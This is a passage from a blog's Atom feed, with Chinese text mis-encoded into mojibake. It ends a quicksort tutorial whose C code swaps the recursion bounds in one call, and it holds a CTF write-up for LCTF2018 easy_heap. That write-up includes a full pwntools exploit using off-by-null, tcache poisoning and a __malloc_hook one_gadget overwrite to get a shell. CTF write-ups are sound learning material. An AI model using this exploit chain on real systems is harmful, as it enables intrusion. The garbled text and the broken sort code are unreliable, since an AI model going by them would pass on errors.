é€‰å–çš„åŸºå‡†æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œåœ¨é‡åˆ°è¾ƒåæƒ…å†µæ—¶æ—¶é—´å¤æ‚åº¦å¾ˆå®¹æ˜“å¤§å¹…åº¦æé«˜ï¼Œå°¤å…¶æ˜¯åœ¨æ•°ç»„æœ‰åºæ—¶ï¼Œè¿™æ ·çš„ä¸€ç§åˆ†å‰²æ–¹å¼ä¼šä½¿å¿«é€Ÿæ’åºé€€åŒ–ä¸ºå†’æ³¡æ’åºï¼Œæ—¶é—´å¤æ‚åº¦é£™å‡è‡³O(N^2)</p><p>é‚£ä¹ˆæœ€ç®€å•çš„ä¼˜åŒ–æ–¹æ³•ä¾¿æ˜¯éå†æ—¶<strong>å–ä½äºæ•°ç»„ä¸­é—´çš„å€¼ä½œä¸ºåŸºå‡†å€¼</strong></p><blockquote><p>æ¥è‡ª<a href="https://blog.csdn.net/insistgogo/article/details/7785038">æŸä½å¤§ä½¬çš„æµ‹è¯•ç»“æœ</a><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWctbXkuY3Nkbi5uZXQvdXBsb2Fkcy8yMDEyMDcvMjgvMTM0MzQ4MzI5N18yNDE1LmpwZw?x-oss-process=image/format,png" alt="img"><br>æœ€ä½³çš„åˆ’åˆ†æ˜¯å°†å¾…æ’åºçš„åºåˆ—åˆ†æˆç­‰é•¿çš„å­åºåˆ—ï¼Œæœ€ä½³çš„çŠ¶æ€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åºåˆ—çš„ä¸­é—´çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ç¬¬N&#x2F;2ä¸ªæ•°ã€‚å¯æ˜¯ï¼Œè¿™å¾ˆéš¾ç®—å‡ºæ¥ï¼Œå¹¶ä¸”ä¼šæ˜æ˜¾å‡æ…¢å¿«é€Ÿæ’åºçš„é€Ÿåº¦ã€‚è¿™æ ·çš„ä¸­å€¼çš„ä¼°è®¡å¯ä»¥é€šè¿‡éšæœºé€‰å–ä¸‰ä¸ªå…ƒç´ å¹¶ç”¨å®ƒä»¬çš„ä¸­å€¼ä½œä¸ºæ¢çº½å…ƒè€Œå¾—åˆ°ã€‚äº‹å®ä¸Šï¼Œéšæœºæ€§å¹¶æ²¡æœ‰å¤šå¤§çš„å¸®åŠ©ï¼Œå› æ­¤ä¸€èˆ¬çš„åšæ³•æ˜¯ä½¿ç”¨å·¦ç«¯ã€å³ç«¯å’Œä¸­å¿ƒä½ç½®ä¸Šçš„ä¸‰ä¸ªå…ƒç´ çš„ä¸­å€¼ä½œä¸ºæ¢çº½å…ƒã€‚æ˜¾ç„¶ä½¿ç”¨ä¸‰æ•°ä¸­å€¼åˆ†å‰²æ³•æ¶ˆé™¤äº†é¢„æ’åºè¾“å…¥çš„ä¸å¥½æƒ…å½¢ï¼Œå¹¶ä¸”å‡å°‘å¿«æ’å¤§çº¦14%çš„æ¯”è¾ƒæ¬¡æ•°</p></blockquote><p>ä¼˜åŒ–åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">a3_qsort</span><span class="params">(<span class="type">int</span>* array, <span class="type">int</span> left, <span class="type">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> mid = array[(left+right)/<span class="number">2</span>];<span class="comment">//å›ºå®šä»¥ä¸­é—´çš„æ•°ä¸ºåŸºå‡†</span></span><br><span class="line">    <span class="type">int</span> i = left;</span><br><span class="line">    <span class="type">int</span> j = right;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(array[i]&lt;=mid)i++;<span class="comment">//ä»å‰å‘åæ‰¾ç¬¬ä¸€ä¸ªæ¯”midå¤§çš„æ•°</span></span><br><span class="line">        <span class="keyword">while</span>(array[j]&gt;=mid)j--;<span class="comment">//ä»åå‘å‰æ‰¾ç¬¬ä¸€ä¸ªæ¯”midå°çš„æ•°</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * äº¤æ¢è¿™ä¸¤ä¸ªæ•°çš„ä½ç½®ï¼Œä½¿æ¯”midå°çš„æ•°éƒ½åœ¨midå‰é¢ï¼Œæ¯”midå¤§çš„æ•°éƒ½åœ¨midåé¢</span></span><br><span class="line"><span class="comment">         * æ³¨æ„ï¼šåœ¨äº¤æ¢è¿‡ç¨‹ä¸­midçš„ä½ç½®ä¹Ÿæ˜¯æœ‰å¯èƒ½ä¼šç§»åŠ¨çš„</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> temp = array[i];</span><br><span class="line">            array[i] = array[j];</span><br><span class="line">            array[j] = temp;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i&lt;=j);<span class="comment">//i&gt;jæ—¶è¯´æ˜å·²ç»éå†è¿‡ä¸€è¶Ÿäº†</span></span><br><span class="line">    <span class="keyword">if</span>(left &lt; j)</span><br><span class="line">        <span class="built_in">a3_qsort</span>(array,left,j);<span class="comment">//å¯¹jå·¦è¾¹çš„éƒ¨åˆ†è¿›è¡Œå¿«æ’</span></span><br><span class="line">    <span class="keyword">if</span>(right &gt; i)</span><br><span class="line">        <span class="built_in">a3_qsort</span>(array,right,i);<span class="comment">//å¯¹iå³è¾¹çš„éƒ¨åˆ†è¿›è¡Œå¿«æ’</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20200615155557204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FydHRuYmEz,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="0x05-é«˜çº§ä¼˜åŒ–"><a href="#0x05-é«˜çº§ä¼˜åŒ–" class="headerlink" title="0x05 é«˜çº§ä¼˜åŒ–"></a>0x05 é«˜çº§ä¼˜åŒ–</h1><blockquote><p>â€œè€å¸ˆï¼Œè¿˜æœ‰æ²¡æœ‰æ›´ç»™åŠ›ç‚¹çš„å•Šâ€<br>â€”â€”â€œç»™ğŸ‘´çˆªå·´â€</p></blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢çš„è¿™æ ·ä¸€ç§ä¼˜åŒ–è™½ç„¶å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šæé«˜å¿«æ’çš„æ•ˆç‡ï¼Œä½†æ˜¯å¯¹äºä¸€äº›ç³Ÿç³•çš„æ•°æ®ï¼ˆå¦‚å¾ˆå°ä»¥åŠéƒ¨åˆ†æœ‰åºæ•°ç»„ï¼‰ï¼Œå¿«æ’çš„æ—¶é—´å¤æ‚åº¦ä»ç„¶ä¼šé£™å‡</p><p>é’ˆå¯¹è¿™æ ·çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥<strong>å…ˆå¯¹æ•°æ®è¿›è¡Œåˆ†æï¼Œå†å†³å®šé‡‡ç”¨ä»€ä¹ˆæ ·çš„æ’åºæ–¹å¼ï¼Œå¤šç§æ’åºæ–¹å¼æ··åˆä½¿ç”¨</strong></p><p>å½“ç„¶è¿™æ ·å­å°±å·²ç»ä¸æ˜¯çº¯ç²¹çš„å¿«æ’äº†ï¼Œ<del>ä½†æ˜¯æ˜¯ä¸æ˜¯å¿«æ’å·²ç»æ— æ‰€è°“äº†ï¼ˆè¯¯</del> </p><blockquote><p>å’•äº†ğŸ•Šï¼Œåé¢å†æŠŠä¼˜åŒ–è¡¥ä¸Šï¼ˆ<del>ğŸ‘ˆè¿™ä¸ªäººè¿˜åœ¨ç ”ç©¶STLæºç </del> </p></blockquote><blockquote><p><strong>æ³¨ï¼šè¿™ä¹Ÿæ˜¯STLä¸­sort()æºç çš„åšæ³•</strong></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00 ç»ªè®º&quot;&gt;&lt;/a&gt;0x00 ç»ªè®º&lt;/h1&gt;&lt;p&gt;ä¼—æ‰€å‘¨çŸ¥ï¼Œå¿«é€Ÿæ’åºæ˜¯æ‰€æœ‰çš„æ’åºç®—æ³•å½“ä¸­é€Ÿåº¦è¾ƒå¿«çš„ä¸€ç§ï¼Œæ‰‹æ’•å¿«æ’ä¹Ÿæˆä¸ºäº†æ¯ä¸€ä½OIerçš„å¿…å¤‡æŠ€èƒ½ï¼ˆ&lt;del&gt;å®é™…ä¸Šå¤§éƒ¨åˆ†äººéƒ½ä¼šç›´æ¥ç”¨STLçš„sortå‡½æ•°XDï¼‰&lt;/del&gt;&lt;br&gt;åˆšå¥½ä»Šå¤©ACMé€‰ä¿®è¯¾å¸ƒç½®çš„è¯¾åä½œä¸šæœ‰ä¸€é“é¢˜å°±æ˜¯å¿«æ’æ¨¡æ¿ï¼Œæ‰€ä»¥ä½œä¸ºä¸€åä¸åˆæ ¼çš„OIerä»Šå¤©æ¥ç®€å•è®²è®²ä»€ä¹ˆæ˜¯å¿«é€Ÿæ’åºç®—æ³•2333&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨ï¼šè¿™ç¯‡æ–‡ç« å†™äº2020.06ï¼Œåªæ˜¯ç°åœ¨åˆšåˆšä»CSDNä¸Šæ¬åˆ°è¿™é‡Œæ¥23333&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="ç®—æ³•æµ…æ" scheme="http://archive.next.arttnba3.cn/categories/%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/"/>
    
    
    <category term="ç®—æ³•" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="å›¾è®º" scheme="http://archive.next.arttnba3.cn/tags/%E5%9B%BE%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x08ã€‘LCTF2018-pwn write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/11/15/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x08%E3%80%91LCTF2018-pwn/"/>
    <id>http://archive.next.arttnba3.cn/2020/11/15/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x08%E3%80%91LCTF2018-pwn/</id>
    <published>2020-11-14T19:12:55.000Z</published>
    <updated>2021-02-20T17:46:59.877Z</updated>
    
    <content type="html"><![CDATA[<!--index_img: https://p0.ssl.qhimg.com/t0110f3b25be7c44636.jpgbanner_img: https://i.loli.net/2020/11/15/AHWvIJ2oFRM58Nb.pngbanner_img_height: 80  banner_mask_alpha: 0.3--><p>æœ€è¿‘å¿™çš„ç„¦å¤´çƒ‚é¢ï¼Œå†™ç‚¹å­¦é•¿ä»¬å‡ºçš„é¢˜æ”¾æ¾ä¸€ä¸‹â€¦ï¼ˆx</p><span id="more"></span><h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p><img src="https://i.loli.net/2020/11/15/uCUwRp8ESTXxLJF.png" alt="image.png"></p><p><strong>LCTF</strong>â€”â€”å‰èº«æ˜¯<strong>XDCTF</strong>ï¼ˆä¸åŒ…æ‹¬2016åŠä»¥åçš„éƒ¨åˆ†ï¼‰ï¼Œæ˜¯ç”±L-TEAM@XDSECä¸»åŠçš„CTFï¼Œ<del>2019å¹´åŠ å…¥D3CTFè±ªåå…¨å®¶æ¡¶</del></p><p>å‰è¾ˆå¸ˆå‚…ä»¬çš„å‡ºé¢˜è´¨é‡å¾ˆé«˜ï¼Œæ‰€ä»¥æˆ‘å¯èƒ½å¡å¥½å‡ å¤©æ‰ä¼šå‡ºä¸€é“é¢˜23333</p><p>è™½ç„¶éš¾æ˜¯çœŸçš„éš¾ï¼Œä½†æ˜¯ä½œä¸ºåä¼šçš„å°å­¦å¼Ÿè¿˜æ˜¯è¦æŠŠå­¦é•¿ä»¬å‡ºè¿‡çš„é¢˜åˆ·ä¸€åˆ·XD</p><h2 id="0x01-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget"><a href="#0x01-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget" class="headerlink" title="0x01.easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget"></a>0x01.easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget</h2><p><a href="/download/lctf2018/easy_heap">ç‚¹å‡»ä¸‹è½½-easy_heap</a></p><p><a href="/download/lctf2018/libc64.so">ç‚¹å‡»ä¸‹è½½-libc64.so</a></p><p>æƒ¯ä¾‹çš„<code>checksec</code>åˆ†æï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="https://i.loli.net/2020/11/16/W2j7nlNHPq5rM9x.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼ˆéƒ¨åˆ†å‡½æ•°åŠå˜é‡ç»è¿‡é‡å‘½å</p><p><img src="https://i.loli.net/2020/11/16/jIc81hvM6mXdEa5.png" alt="image.png"></p><p>æœä¸å…¶ç„¶ï¼Œä¼ ç»Ÿçš„CTFç­¾åˆ°é¢˜éƒ½æ˜¯å †é¢˜ï¼ŒLCTF2018ä¹Ÿä¸ä¾‹å¤–</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºæœ¬èº«<strong>ä»…ä¼šåˆ†é…å¤§å°ä¸º</strong><code>0xF8</code>çš„å †å—</p><p><img src="https://i.loli.net/2020/11/16/a9BSzldOX1gGQR3.png" alt="image.png"></p><p>åŒæ—¶æœ¬é¢˜åªå…è®¸æˆ‘ä»¬åˆ†é…10ä¸ªå †å—ï¼Œåœ¨éœ€è¦ç”¨7ä¸ªæ¥å¡«æ»¡tcacheçš„å‰æä¸‹ï¼Œ å¯ç”¨ç©ºé—´å±å®æœ‰ä¸€ä¸¶ä¸¶ç´§å¼ </p><p><img src="https://i.loli.net/2020/11/16/WjvhU3xuMOHtXE8.png" alt="image.png"></p><p>æ¼æ´ç‚¹å­˜åœ¨äºè¯»å…¥è¾“å…¥æ—¶ï¼Œä¼šå°†å½“å‰chunkçš„*(ptr + size)ç½®0</p><p><img src="https://i.loli.net/2020/11/16/4cAr58VdzIm3us2.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œè‹¥æ˜¯æˆ‘ä»¬è¾“å…¥çš„sizeä¸º<code>0xf8</code>ï¼Œåˆ™æœ‰æœºä¼šå°†ä¸‹ä¸€ä¸ª<strong>ç‰©ç†ç›¸é‚»chunkçš„PREV_INUSEåŸŸè¦†ç›–ä¸º0</strong>ï¼Œå³<strong>å­˜åœ¨off by nullæ¼æ´</strong></p><blockquote><p>248 &#x3D; 16*15 + 8</p></blockquote><p>é€šè¿‡off by nullæ¼æ´æˆ‘ä»¬ä¾¿å¯ä»¥å®ç°å †å—çš„é‡å ï¼ˆoverlapï¼‰ï¼šåœ¨tcacheæœ‰å…­ä¸ªchunkã€æˆ‘ä»¬æ‰‹ä¸Šæœ‰åœ°å€è¿ç»­çš„ä¸‰ä¸ªchunkï¼šAã€Bã€Cçš„æƒ…å†µä¸‹ï¼Œå…ˆfreeæ‰Bï¼Œé€å…¥tcacheä¸­ä¿æŠ¤èµ·æ¥ï¼Œfreeæ‰Aé€å…¥tcacheï¼Œå†mallocå›Bï¼Œ<strong>è¦†å†™Cçš„PREV_IN_USEä¸º0ï¼Œä¹‹åfreeæ‰Cï¼Œè§¦å‘malloc_consolidateï¼Œåˆå¹¶æˆä¸ºä¸€ä¸ª0x300çš„å¤§chunk</strong>ï¼Œå®ç°<strong>overlapping</strong></p><p>ä¹‹åå€’ç©ºtcacheï¼Œå†åˆ†é…ä¸€ä¸ªchunkï¼Œä¾¿ä¼šåˆ†å‰²unsorted biné‡Œçš„å¤§chunkï¼Œæ­¤æ—¶unsorted biné‡Œçš„chunkä¸æ­¤å‰çš„chunk Bé‡å ï¼Œ<strong>è¾“å‡ºchunk Bçš„å†…å®¹ä¾¿èƒ½è·å¾—libcåŸºå€</strong></p><p>å†åˆ†é…ä¸€ä¸ªchunkä»¥å¾—åˆ°æŒ‡å‘ç›¸åŒä½ç½®ä¸Šçš„å †å—çš„ç´¢å¼•ï¼Œ<strong>åœ¨è¿™é‡Œæ„é€ tcache poisoningè¦†å†™__malloc_hookä¸ºone_gadgetåéšä¾¿åˆ†é…ä¸€ä¸ªchunkå³å¯getshell</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨é‡Šæ”¾å †å—çš„åŠŸèƒ½å‡½æ•°ä¸­åœ¨freeå‰ä¼šå…ˆæ¸…ç©ºå †å—å†…å®¹ï¼Œæ•…åœ¨è¿™é‡Œæ— æ³•é€šè¿‡ä¿®æ”¹__free_hookä¸ºsystemåfree(â€œ&#x2F;bin&#x2F;shâ€)çš„æ–¹æ³•æ¥getshellï¼Œå› æ­¤ç¬”è€…åªå¥½é€‰æ‹©æ”»å‡»__malloc_hook</p><p><img src="https://i.loli.net/2021/01/20/Za2wEpFAUu4mN7Q.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">9</span>-i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unsorted bin chunk consolidate</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># re-malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fill the tcache, protect the important chunk</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin overlap</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">0xF8</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 7, the former 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 8</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc addr leak: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 9</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + one_gadget)) <span class="comment"># fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸgetshellï¼ˆæœ¬åœ°ç¯å¢ƒUbuntu18.0.4ï¼‰</p><p><img src="https://i.loli.net/2020/11/26/XAZm7UrvFw8cfih.png" alt="image.png"></p><h1 id="0x02-pwn4fun"><a href="#0x02-pwn4fun" class="headerlink" title="0x02.pwn4fun"></a>0x02.pwn4fun</h1><h1 id="0x03-justpwn-House-of-Spirit"><a href="#0x03-justpwn-House-of-Spirit" class="headerlink" title="0x03.justpwn -  House of Spirit"></a>0x03.justpwn -  House of Spirit</h1><p><a href="/download/lctf2018/just_pwn">ç‚¹å‡»ä¸‹è½½-just_pwn</a></p><h1 id="0x04-echos"><a href="#0x04-echos" class="headerlink" title="0x04.echos"></a>0x04.echos</h1>]]></content>
    
    
    <summary type="html">&lt;!--index_img: https://p0.ssl.qhimg.com/t0110f3b25be7c44636.jpg
banner_img: https://i.loli.net/2020/11/15/AHWvIJ2oFRM58Nb.png
banner_img_height: 80  
banner_mask_alpha: 0.3--&gt;

&lt;p&gt;æœ€è¿‘å¿™çš„ç„¦å¤´çƒ‚é¢ï¼Œå†™ç‚¹å­¦é•¿ä»¬å‡ºçš„é¢˜æ”¾æ¾ä¸€ä¸‹â€¦ï¼ˆx&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="å †" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="one_gadget" scheme="http://archive.next.arttnba3.cn/tags/one-gadget/"/>
    
    <category term="Pwn" scheme="http://archive.next.arttnba3.cn/tags/Pwn/"/>
    
    <category term="LCTF" scheme="http://archive.next.arttnba3.cn/tags/LCTF/"/>
    
    <category term="off by null" scheme="http://archive.next.arttnba3.cn/tags/off-by-null/"/>
    
    <category term="House of Spirit" scheme="http://archive.next.arttnba3.cn/tags/House-of-Spirit/"/>
    
  </entry>
  
  <entry>
    <title>ã€ç”µå­å–è¯-0x02ã€‘ç¾äºšæ¯ç¬¬äº”å±Šå…¨å›½ç”µå­å–è¯ç«èµ›èµ„æ ¼èµ›write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/11/08/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x02%E3%80%91/"/>
    <id>http://archive.next.arttnba3.cn/2020/11/08/%E3%80%90%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-0x02%E3%80%91/</id>
    <published>2020-11-08T05:32:06.000Z</published>
    <updated>2020-11-12T07:40:36.245Z</updated>
    
